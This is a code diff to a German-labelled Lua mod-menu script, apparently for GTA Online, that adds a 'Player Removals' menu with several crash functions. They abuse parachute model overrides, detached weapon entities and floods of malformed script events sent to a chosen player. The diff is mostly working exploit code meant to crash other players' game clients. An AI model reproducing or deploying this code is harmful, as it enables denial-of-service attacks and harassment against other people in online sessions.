@@ -3,11 +3,11 @@ require("natives-1640181023")
 require("natives-1606100775")
 util.require_natives(1627063482)
 util.require_natives("natives-1660775568-uno")
-util.toast("Athego's Script erfolgreich geladen! DEV Version 1.5")
+util.toast("Athego's Script erfolgreich geladen! DEV Version 1.4")
 ocoded_for = 1.61
 
 local response = false
-local localVer = 1.36
+local localVer = 1.4
 async_http.init("raw.githubusercontent.com", "/BassamKhaleel/Athegos-Skript-DEV-Stand/main/AthegosSkriptVersion", function(output)
     currentVer = tonumber(output)
     response = true
@@ -474,6 +474,92 @@ function PlayerlistFeatures(pid)
             entities.delete_by_handle(stupid_object)
             entities.delete_by_handle(glitch_vehicle)
             util.yield(delay)    
+        end
+    end)
+
+    local player_removals = menu.list(playerr, "Player Removals", {}, "")
+    local kicks = menu.list(player_removals, "Kicks", {}, "")
+    local crashes = menu.list(player_removals, "Crashes", {}, "")
+
+    menu.action(crashes, "Perle der Natur", {"nature"}, "", function()
+        local user = players.user()
+        local user_ped = players.user_ped()
+        local pos = players.get_position(user)
+        BlockSyncs(pid, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
+            util.yield(100)
+            menu.trigger_commands("invisibility on")
+            for i = 0, 110 do
+                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
+                PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
+                util.yield(50)
+                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
+            end
+            util.yield(250)
+            for i = 1, 5 do
+                util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
+            end
+            ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
+            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
+            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
+            menu.trigger_commands("invisibility off")
+        end)
+    end)
+    
+    menu.action(crashes, "Hiroshima", {"hiroshima"}, "", function()
+        local user = players.user()
+        local user_ped = players.user_ped()
+        local pos = players.get_position(user)
+        BlockSyncs(pid, function() 
+            util.yield(100)
+            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
+            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
+            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
+            util.yield(200)
+            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
+            util.yield(500)
+            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
+            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
+            util.yield(1000)
+            for i = 1, 5 do
+                util.spoof_script("freemode", SYSTEM.WAIT)
+            end
+            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
+            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
+        end)
+    end)
+
+    menu.action(crashes, "Kinder Schutz Service", {""}, "", function()
+        local mdl = util.joaat('a_c_poodle')
+        BlockSyncs(pid, function()
+            if request_model(mdl, 2) then
+                local pos = players.get_position(pid)
+                util.yield(100)
+                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
+                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
+                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
+                local obj
+                repeat
+                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
+                until obj ~= 0 or util.yield()
+                ENTITY.DETACH_ENTITY(obj, true, true) 
+                util.yield(1500)
+                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
+                entities.delete_by_handle(ped1)
+                util.yield(1000)
+            else
+                util.toast("Fehler beim Laden des Models.")
+            end
+        end)
+    end)
+
+    menu.action(crashes, "Linus Crash Tips", {}, "", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+        for i = 1, 150 do
+            util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
+            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
         end
     end)
 
